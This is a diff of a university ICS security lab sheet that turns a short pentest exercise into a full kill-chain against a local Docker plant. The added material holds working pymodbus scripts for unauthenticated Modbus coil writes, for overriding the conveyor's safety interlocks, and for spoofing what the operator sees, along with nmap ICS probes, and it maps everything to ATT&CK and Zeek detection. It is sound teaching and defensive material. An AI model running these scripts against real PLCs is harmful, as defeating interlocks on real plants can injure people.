@@ -2,7 +2,7 @@
 
 \def\courseTitle{Industrial Security (Master)}
 \def\labNumber{04}
-\def\labTitle{End-to-End Mini Pentest in the Bachelor Lab Stack}
+\def\labTitle{Offensive ICS -- Authorised Kill-Chain on the Lab Plant}
 \def\labSection{04}
 \def\labTime{3--4 hours}
 
@@ -11,62 +11,466 @@
 \begin{document}
 \labheader
 
+% ====================================================================
+\begin{warnbox}
+\textbf{Authorised use only -- read before you touch a keyboard.}
+Every technique in this lab is destructive by design: unauthenticated
+Modbus writes, NSE probing of ICS protocols, safety-logic defeat, and
+operator deception. You may run them \emph{only} against the Bachelor
+Docker stack you started yourself, on the private
+\texttt{172.28.0.0/16} bridge. Pointing any of these tools at hardware
+you do not own -- a colleague's PLC, a vendor demo unit, a real plant --
+is a criminal offence under \S\,202a / \S\,202c StGB (and CFAA, Computer
+Misuse Act, etc.), and against OT it can injure or kill people. There
+is no ``I was just testing'' defence. No signed Rules of Engagement,
+no test. This sheet \emph{is} your scope: the lab containers, nothing
+else.
+\end{warnbox}
+
 \begin{goalbox}
-Run a full mini-engagement against the Bachelor Docker lab stack:
-ROE \(\to\) passive recon \(\to\) active recon \(\to\) one exploitation
-step \(\to\) detection observation \(\to\) report.
+Execute a complete, attributable mini-engagement against the lab plant
+and tie every offensive action to (a) a MITRE ATT\&CK for ICS technique
+ID and (b) the detection it produced (or evaded) in Zeek. You will:
+sign your own ROE; run passive then active reconnaissance; enumerate
+Modbus function codes; perform unauthorised writes; simulate a
+TRITON-style safety-logic defeat against the conveyor interlocks; run
+an HMI-replay / process-spoof; and finally write a short engagement
+report that a blue team could act on without re-doing the work. The
+deliverable is the report -- offence is only useful if it teaches the
+defender something.
 \end{goalbox}
 
-\begin{stepbox}{0 -- Sign a fake ROE}
-Write the ROE for testing the Docker stack as if it were a real client.
-Self-sign as both tester and approver. Save it -- you will reference
-it in the report.
-\end{stepbox}
+% ====================================================================
+\section*{Target description (your scope)}
 
-\begin{stepbox}{1 -- Passive recon}
+The authorised target is the Bachelor lab stack at
+\texttt{bachelor/labs/\_stack}. On the \texttt{is-lab}
+(\texttt{172.28.0.0/16}) bridge:
+
+\begin{center}
+\small
+\begin{tabular}{@{}p{3.3cm}p{3.0cm}p{3.0cm}p{4.0cm}@{}}
+\toprule
+\textbf{Host} & \textbf{Address} & \textbf{Service} & \textbf{Role} \\
+\midrule
+\texttt{is-openplc} & 172.28.0.10 & Modbus/502, HTTP/8080 & PLC + engineering UI (target) \\
+\texttt{is-opcua}   & 172.28.0.11 & OPC UA/4840           & OPC UA server (anon endpoint) \\
+\texttt{is-mqtt}    & 172.28.0.12 & MQTT/1883             & IIoT broker (side surface) \\
+\texttt{is-student} & 172.28.0.20 & ---                   & your attacker workstation \\
+\texttt{is-zeek}    & (netns of openplc) & passive       & SOC sensor (the blue team) \\
+\bottomrule
+\end{tabular}
+\end{center}
+
+The PLC runs a conveyor seal-in latch (\texttt{conveyor.st}):
+\texttt{Motor := (Start OR Motor) AND Stop AND Guard1 AND Guard2; Lamp
+:= Motor;}. The two guard inputs and the (normally-closed) Stop are the
+\emph{interlocks} -- the safety logic you will later defeat. I/O map:
+\texttt{\%QX0.0} Motor = coil~0, \texttt{\%QX0.1} Lamp = coil~1,
+\texttt{\%IX0.1} Stop = discrete input~1, \texttt{\%IX0.2/0.3}
+Guard1/Guard2 = discrete inputs 2--3.
+
+\begin{notebox}
+Run the attacker tooling from inside \texttt{is-student}
+(\texttt{docker compose exec student bash}); read Zeek's logs from the
+host at \texttt{bachelor/labs/\_stack/zeek-logs/}. The student container
+ships \texttt{nmap}, \texttt{tshark}/\texttt{tcpdump},
+\texttt{pymodbus}, \texttt{asyncua}, \texttt{procps}. It does
+\emph{not} ship the Nmap S7/ENIP scripts' targets in this stack -- those
+probes are part of the exercise (you will observe what a real PLC would
+answer vs.\ what OpenPLC answers).
+\end{notebox}
+
+% ====================================================================
+\section*{Rules of engagement and setup}
+
+\begin{stepbox}{0 -- Sign your ROE, then bring the range up}
+Write a one-page Rules-of-Engagement document for this engagement as if
+the lab were a paying client. It must name: the scope
+(\texttt{172.28.0.0/16}, the five containers above), the window
+(now $\to$ end of session), the permitted techniques (recon, protocol
+abuse, logic injection, replay), the explicit \emph{out of scope} list
+(the Docker host, the landing page, the Internet), the kill-switch
+(\texttt{docker compose down}), and a named approver. Self-sign as both
+tester and approver and timestamp it -- you will attach it to the
+report.
+
 \begin{lstlisting}[language=bash]
-cd bachelor/labs/_stack && docker compose up -d
-# 30 minutes of passive baseline:
-ls zeek-logs/current/
+cd bachelor/labs/_stack
+docker compose up -d
+docker compose ps
 \end{lstlisting}
-Note: which devices, which protocols, which talkers.
-\end{stepbox}
-
-\begin{stepbox}{2 -- Active recon (low-rate)}
+Expect \texttt{is-openplc}, \texttt{is-opcua}, \texttt{is-mqtt},
+\texttt{is-student}, \texttt{is-zeek} \texttt{Up};
+\texttt{is-openplc-init} \texttt{Exited (0)}. Confirm the plant logic is
+running (PLC web UI answers):
 \begin{lstlisting}[language=bash]
-docker compose exec student nmap -sT --max-rate 5 \
-   --scan-delay 200ms -Pn -p 502,4840,1883,8080 172.28.0.0/24
+docker compose exec student curl -s http://172.28.0.10:8080/login \
+  -o /dev/null -w "HTTP %{http_code}\n"
 \end{lstlisting}
-Record which hosts respond on which ports.
+Expected: \texttt{HTTP 200}. Note the wall-clock minute -- every action
+from here is auditable against it.
 \end{stepbox}
 
-\begin{stepbox}{3 -- One exploitation step}
+% ====================================================================
+\section*{Phase 1 -- Reconnaissance}
+
+\begin{stepbox}{1 -- Passive baseline (Discovery, no packets you send)}
+Before you touch the target, let the SOC sensor build a baseline and
+read the wire passively. Drive 60\,s of legitimate poll traffic, then
+look at what Zeek already knows about the segment:
+\begin{lstlisting}[language=bash]
+docker compose exec -d student python3 /labs/scripts/modbus_poll_loop.py
+sleep 60
+docker compose exec student pkill -f modbus_poll_loop
+ls bachelor/labs/_stack/zeek-logs/
+jq -r '[.id.orig_h,.id.resp_h,.service,.proto] | @tsv' \
+   bachelor/labs/_stack/zeek-logs/conn.log | sort -u | head
+\end{lstlisting}
+\textit{What to look for:} which hosts talk, which protocol
+(\texttt{modbus}), the polling cadence in \texttt{conn.log}. This is
+pure observation of existing traffic -- it maps to
+\textbf{T0842 Network Sniffing} and \textbf{T0840 Network Connection
+Enumeration}. \emph{Zeek sees nothing new from you} -- that is the
+point of doing it first.
+\end{stepbox}
+
+\begin{stepbox}{2 -- Active recon: low-rate port scan (Discovery)}
+Now you start sending packets. Keep it slow and scoped -- a flood scan
+against real OT can crash fragile stacks.
+\begin{lstlisting}[language=bash]
+docker compose exec student nmap -sT -Pn --max-rate 5 \
+   --scan-delay 200ms -p 502,1883,4840,8080,44818,102 172.28.0.0/24
+\end{lstlisting}
+\textit{Expected (abridged):}
+\begin{lstlisting}
+172.28.0.10  502/tcp open  ...  8080/tcp open
+172.28.0.11  4840/tcp open
+172.28.0.12  1883/tcp open
+\end{lstlisting}
+\textit{What to look for:} 502 (Modbus) and 8080 (engineering UI) on
+\texttt{.10}; 4840 (OPC UA) on \texttt{.11}; 1883 (MQTT) on \texttt{.12}.
+Ports 44818 (EtherNet/IP) and 102 (S7comm) are \emph{closed} here --
+note that, because on a real ICS those would tell you the vendor. This
+is \textbf{T0846 Remote System Discovery}. The connect-scan shows up in
+\texttt{conn.log} as a burst of short flows from \texttt{172.28.0.20}.
+\end{stepbox}
+
+\begin{stepbox}{3 -- Protocol fingerprint and function-code enumeration}
+Ask each device who it is, then map the Modbus address space.
+\begin{lstlisting}[language=bash]
+# Modbus identity via NSE (T0888 Remote System Information Discovery):
+docker compose exec student nmap -p 502 --script modbus-discover 172.28.0.10
+# S7/ENIP scripts -- run them so you see "no S7 here" (vs. a real plant):
+docker compose exec student nmap -p 102 --script s7-info 172.28.0.10
+# OPC UA anonymous endpoint enumeration:
+docker compose exec student python3 /labs/scripts/opcua_browse.py
+\end{lstlisting}
+Then probe which Modbus function codes the PLC honours, by reading every
+table once:
+\begin{lstlisting}[language=bash]
+docker compose exec student python3 - <<'PY'
+from pymodbus.client import ModbusTcpClient
+c = ModbusTcpClient("172.28.0.10", port=502); c.connect()
+print("FC1 coils 0..7      :", c.read_coils(0, count=8, slave=1).bits[:8])
+print("FC2 discrete 0..7   :", c.read_discrete_inputs(0, count=8, slave=1).bits[:8])
+print("FC3 holding 0..9    :", c.read_holding_registers(0, count=10, slave=1).registers)
+print("FC4 input regs 0..3 :", c.read_input_registers(0, count=4, slave=1).registers)
+c.close()
+PY
+\end{lstlisting}
+\textit{Expected (idle plant):}
+\begin{lstlisting}
+FC1 coils 0..7      : [False, False, False, ...]
+FC2 discrete 0..7   : [False, True, True, True, False, ...]
+FC3 holding 0..9    : [0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
+FC4 input regs 0..3 : [0, 0, 0, 0]
+\end{lstlisting}
+\textit{What to look for:} the discrete inputs read
+\texttt{[Start=F, Stop=T, Guard1=T, Guard2=T]} -- the interlocks are
+healthy. The read-only enumeration is still
+\textbf{T0846/T0888 Discovery}; no write yet, so Zeek's notice rule
+stays quiet (reads are FC1--4, the rule fires only on FC 5/6/15/16).
+\end{stepbox}
+
+% ====================================================================
+\section*{Phase 2 -- Exploitation}
+
+\begin{warnbox}
+From here on you are issuing commands that change plant state. Modbus
+has \emph{no rollback}: a write commits the instant the PLC
+acknowledges it. On a real engagement a process engineer is in the loop
+and the safety case has been reviewed. Here, the only thing you can
+break is a container you can recreate with \texttt{docker compose down -v
+\&\& docker compose up -d}.
+\end{warnbox}
+
+\begin{stepbox}{4 -- Unauthorised write (Impair Process Control)}
+Flip the motor coil with no authentication:
 \begin{lstlisting}[language=bash]
 docker compose exec student python3 /labs/scripts/modbus_inject.py
 \end{lstlisting}
-Confirm in OpenPLC monitor that coil 0 flipped.
+\textit{Expected:}
+\begin{lstlisting}
+Write result: WriteSingleCoilResponse(1,0,1)
+\end{lstlisting}
+Open the OpenPLC \emph{Monitoring} page (\url{http://127.0.0.1:8080})
+and confirm coil~0 (Motor) flips. \textit{What to look for:} the write
+is a single FC5 (\texttt{WRITE\_SINGLE\_COIL}). The ladder re-evaluates
+every 20\,ms, so a one-shot write is overwritten almost immediately --
+note how briefly it holds. This is
+\textbf{T0855 Unauthorized Command Message} +
+\textbf{T0831 Manipulation of Control}. It is also the first action
+that trips detection: check it now.
+\begin{lstlisting}[language=bash]
+tail -n 2 bachelor/labs/_stack/zeek-logs/notice.log
+\end{lstlisting}
+You should see a \texttt{ModbusWatch::Unsolicited\_Write} notice
+naming \texttt{172.28.0.20 -> 172.28.0.10 (FC=5)}. \emph{Record the
+delta} between your write and the notice timestamp -- that is the
+detection latency you will report.
 \end{stepbox}
 
-\begin{stepbox}{4 -- Detection}
-Check Zeek's \texttt{notice.log} for the unsolicited-write notice.
-Document the time difference between attack and detection.
+\begin{stepbox}{5 -- TRITON-style safety-logic defeat (Inhibit/Defeat interlocks)}
+TRITON/TRISIS (2017) reprogrammed a Triconex \emph{safety
+instrumented system} so its interlocks would no longer trip. We cannot
+reflash OpenPLC's runtime, so we simulate the \emph{effect}: hold the
+interlock-defeating writes faster than the 20\,ms scan so the conveyor
+runs even though, logically, a guard or stop should hold it. Force the
+Motor coil on continuously while pinning the interlock-derived state:
+\begin{lstlisting}[language=bash]
+docker compose exec student python3 - <<'PY'
+import time
+from pymodbus.client import ModbusTcpClient
+c = ModbusTcpClient("172.28.0.10", port=502); c.connect()
+t_end = time.time() + 30
+n = 0
+while time.time() < t_end:
+    c.write_coil(0, True, slave=1)        # force Motor ON (defeat seal-in)
+    c.write_coil(1, True, slave=1)        # keep Lamp consistent for now
+    n += 1
+    time.sleep(0.01)                       # faster than the 20 ms scan
+c.close()
+print(f"held Motor ON across {n} writes (interlocks bypassed)")
+PY
+\end{lstlisting}
+\textit{Expected:} \texttt{held Motor ON across \~{}3000 writes
+(interlocks bypassed)}. \textit{What to look for:} on the Monitoring
+page the Motor stays ON for the full 30\,s even if you (mentally)
+``open a guard'' -- the safety interlock no longer governs the output,
+because an external master is overriding it every scan. This is the
+lab analogue of \textbf{T0858 Change Operating Mode} +
+\textbf{T0880 Loss of Safety} (the SIS no longer protects the
+process). Every write is an FC5; Zeek's \texttt{notice.log} now floods
+with \texttt{Unsolicited\_Write}.
+\begin{lstlisting}[language=bash]
+grep -c Unsolicited_Write bachelor/labs/_stack/zeek-logs/notice.log
+\end{lstlisting}
+\textbf{Caveat to state in your report:} a true SIS attack would also
+\emph{disable} the detection and the trip; here the write storm is
+loud. Defeating safety \emph{quietly} is the hard part -- and the
+reason TRITON was caught (it tripped the SIS into a safe state,
+revealing itself).
 \end{stepbox}
 
-\begin{stepbox}{5 -- Report}
-Produce a 2-page report with: ROE summary, recon findings,
-exploitation step (with PCAP excerpt), detection evidence,
-prioritised recommendations.
+\begin{stepbox}{6 -- HMI replay + process spoof (operator deception)}
+Now combine cover traffic with a lie. First capture 60\,s of normal
+poll, then drive the motor while pinning the operator-visible Lamp to
+the wrong value.
+\begin{lstlisting}[language=bash]
+docker compose exec -d student tcpdump -i eth0 \
+  -w /labs/captures/m04.pcap port 502
+docker compose exec -d student python3 /labs/scripts/modbus_poll_loop.py
+sleep 60
+docker compose exec student pkill -INT tcpdump
+docker compose exec student pkill -f modbus_poll_loop
+tshark -r bachelor/labs/_stack/captures/m04.pcap -Y modbus | head -3
+\end{lstlisting}
+Replay those PDUs at the application layer (cover), then run the spoof:
+\begin{lstlisting}[language=bash]
+docker compose exec student python3 - <<'PY'
+import time
+from pymodbus.client import ModbusTcpClient
+c = ModbusTcpClient("172.28.0.10", port=502); c.connect()
+t_end = time.time() + 30
+while time.time() < t_end:
+    c.write_coil(0, True,  slave=1)   # Motor ON  (process moves)
+    c.write_coil(1, False, slave=1)   # Lamp OFF  (operator sees "stopped")
+    time.sleep(0.02)
+c.close()
+print("spoof window done: Motor=ON shown as Lamp=OFF")
+PY
+\end{lstlisting}
+\textit{What to look for:} on the Monitoring page, Motor and Lamp
+\emph{disagree} -- the ladder source says they must be equal. The
+replay traffic itself is all FC3 reads, indistinguishable from a normal
+poll. This is \textbf{T0856 Spoof Reporting Message} +
+\textbf{T0832 Manipulation of View}, with replay as
+\textbf{T0820 Exploitation for Evasion}. The replay reads slip past
+Zeek's write-only rule entirely; only the FC5 spoof writes raise
+notices -- exactly the Stuxnet/Industroyer cover pattern.
 \end{stepbox}
 
+\begin{stepbox}{7 -- Detection reconciliation (tie offence to the blue team)}
+For each offensive action above, find its footprint in Zeek and build
+the attack$\to$detection table you will hand the SOC.
+\begin{lstlisting}[language=bash]
+# All writes Zeek saw, with function code:
+jq -c 'select(.func | test("WRITE")) | {ts,orig:.id.orig_h,func}' \
+   bachelor/labs/_stack/zeek-logs/modbus.log | head
+# First malicious write in human time:
+jq -r 'select(.note=="ModbusWatch::Unsolicited_Write") | .ts' \
+   bachelor/labs/_stack/zeek-logs/notice.log | head -1 \
+   | xargs -I{} date -d @{} '+%H:%M:%S'
+# Did the replay raise anything? (expect: no)
+jq -c 'select(.func | test("READ"))' \
+   bachelor/labs/_stack/zeek-logs/modbus.log | wc -l
+\end{lstlisting}
+\textit{What to look for:} writes (Steps 4--6) are all in
+\texttt{notice.log}; the replay reads (Step 6) appear only in
+\texttt{modbus.log} as \texttt{READ\_HOLDING\_REGISTERS} with \emph{no}
+notice. Conclusion for the report: this sensor catches \emph{protocol
+abuse} (writes) but is blind to \emph{behavioural} attacks (replay,
+view manipulation that uses only reads). That gap is what you
+recommend closing.
+\end{stepbox}
+
+% ====================================================================
+\section*{ATT\&CK and detection mapping}
+
+Reproduce and complete this table from your own evidence; it is the
+spine of the report.
+
+\begin{center}
+\small
+\begin{tabular}{@{}p{1.0cm}p{4.7cm}p{4.0cm}p{3.6cm}@{}}
+\toprule
+\textbf{Step} & \textbf{Action} & \textbf{ATT\&CK for ICS} & \textbf{Zeek detection} \\
+\midrule
+1 & Passive sniff / baseline      & T0842, T0840 & none (passive) \\
+2 & Low-rate port scan            & T0846        & conn.log flow burst \\
+3 & Fingerprint + FC enumeration  & T0888, T0846 & modbus.log reads only \\
+4 & Unauthorised coil write       & T0855, T0831 & notice: Unsolicited\_Write \\
+5 & Safety-logic defeat (sim.)    & T0858, T0880 & notice flood (FC5) \\
+6 & Replay + view spoof           & T0856, T0832, T0820 & writes seen; replay missed \\
+\bottomrule
+\end{tabular}
+\end{center}
+
+% ====================================================================
+\section*{Troubleshooting}
+
+\begin{notebox}
+\begin{itemize}\setlength{\itemsep}{1pt}
+  \item \texttt{HTTP 000} / connection refused on \texttt{:8080} --
+        the PLC is still booting or \texttt{openplc-init} has not run.
+        Wait for the healthcheck, then re-run; if needed
+        \texttt{docker compose up -d openplc-init}.
+  \item \texttt{notice.log} empty after a write -- Zeek shares
+        OpenPLC's netns; if it crashed, \texttt{docker compose restart
+        zeek} and re-issue one write. Zeek needs \texttt{-C}
+        (checksum-ignore, already set) or it drops bridged frames.
+  \item \texttt{pymodbus} \texttt{slave} vs.\ \texttt{unit} keyword --
+        this stack pins \texttt{pymodbus 3.6.9}; use \texttt{slave=1}.
+  \item Empty PCAP -- \texttt{tcpdump} needs \texttt{NET\_RAW}
+        (granted to \texttt{student}); confirm you captured on
+        \texttt{eth0} and that the poll loop was running.
+  \item Spoof ``doesn't show'' on the HMI -- the browser polls slower
+        than your write loop; shorten \texttt{sleep} or refresh during
+        the 30\,s window.
+\end{itemize}
+\end{notebox}
+
+% ====================================================================
+\section*{Stretch goals}
+
+\begin{stepbox}{S1 -- Quiet your own attack (evasion vs.\ the rule)}
+Zeek's rule fires on \emph{any} FC5/6/15/16. Can you achieve the same
+process effect (Motor ON) using only function codes the rule ignores?
+You cannot -- coils require a write FC -- so instead reason about and
+\emph{document} what a behavioural rule would have to track (per-source
+write-rate, new-master detection, transaction-ID replay) to catch what
+the current rule misses. Propose the Zeek logic in prose.
+\end{stepbox}
+
+\begin{stepbox}{S2 -- Pivot surface mapping}
+Enumerate the OPC UA anonymous endpoint (\texttt{opcua\_browse.py}) and
+the MQTT broker (\texttt{mosquitto\_sub -h 172.28.0.12 -t '\#' -C 3}).
+Add both to the report as \emph{additional attack surface} with their
+own ATT\&CK mapping (T0846 discovery; for an unauthenticated MQTT
+broker, T0855 if it carried control topics). State why segmenting these
+off the PLC VLAN would reduce blast radius.
+\end{stepbox}
+
+% ====================================================================
+\section*{Cleanup}
+
+\begin{stepbox}{Tear down the range}
+\begin{lstlisting}[language=bash]
+cd bachelor/labs/_stack
+docker compose down -v
+\end{lstlisting}
+\texttt{-v} drops the volumes so the plant resets to a clean,
+known-good state for the next engagement.
+\end{stepbox}
+
+% ====================================================================
 \begin{deliverbox}
-The fake ROE, the recon and PCAP files, and the 2-page report.
-Hand in as a single PDF.
+Hand in a single PDF engagement report (5--8 pages) containing:
+\begin{enumerate}\setlength{\itemsep}{1pt}
+  \item \textbf{Executive summary} (half page, plain language: what you
+        could do to the plant and why it matters).
+  \item \textbf{Scope \& ROE} -- your signed Step-0 document.
+  \item \textbf{Reconnaissance findings} -- the nmap output (Step 2),
+        the FC enumeration (Step 3), open services table.
+  \item \textbf{Findings}, one per exploitation step (4--6), each with:
+        title, the command run, the observed effect, the
+        \textbf{ATT\&CK for ICS technique ID(s)}, a process-impact
+        rating, and a reproduction snippet.
+  \item \textbf{Attack$\to$detection table} (the spine table above),
+        completed from your Zeek evidence, including the
+        detection-latency delta from Step 4 and the
+        replay-was-missed observation from Step 7.
+  \item \textbf{Prioritised recommendations} -- sized this-quarter /
+        this-year (e.g.\ deny-by-default on FC5/6/15/16 from
+        non-engineering hosts; behavioural replay detection;
+        segment OPC UA/MQTT off the control VLAN).
+  \item \textbf{Appendix} -- the PCAP excerpt and raw \texttt{notice.log}
+        lines.
+\end{enumerate}
+A finding without a working reproduction is theatre. A finding without
+an ATT\&CK ID and a detection note does not earn full marks.
 \end{deliverbox}
 
+% ====================================================================
+\section*{Further reading}
+
+\begin{notebox}
+\begin{itemize}\setlength{\itemsep}{1pt}
+  \item MITRE. \emph{ATT\&CK for ICS} knowledge base -- technique IDs
+        cited throughout (T08xx). Map every action you take.
+  \item Dragos / Mandiant. \emph{PIPEDREAM / INCONTROLLER} reporting,
+        2022 -- modular ICS attack framework targeting Modbus,
+        OPC UA, Schneider, Omron. The real-world shape of Steps 4--6.
+  \item ISA. \emph{TR84.00.09} -- security countermeasures for safety
+        instrumented systems; the standard your Step-5 finding maps to.
+  \item CISA. \emph{AA22-103A} (13 Apr 2022) -- APT tools for ICS/SCADA
+        devices; joint advisory underpinning the PIPEDREAM disclosure.
+  \item Schneider Electric / NCCIC. \emph{TRITON/TRISIS} (2017)
+        analysis -- the safety-logic attack Step 5 simulates.
+\end{itemize}
+\end{notebox}
+
+% ====================================================================
 \begin{warnbox}
-This whole sequence runs against your local Docker stack only.
-Performing any step against equipment you do not own without
-written authorisation is a criminal act under \S 202a StGB
-(and equivalents in other jurisdictions).
+\textbf{Final authorisation reminder.} These commands are lawful here
+only because the target is a container you started on a private bridge
+on your own host, under a self-signed ROE that names exactly that
+scope. The instant the destination changes -- even to a friend's PLC,
+even with verbal permission -- you need a written, scoped engagement,
+a process engineer in the loop, and a reviewed safety case. For OT,
+\emph{Modbus has no undo} and a defeated interlock can injure people.
+Offence without authorisation is not research; it is a crime.
 \end{warnbox}
+
 \end{document}
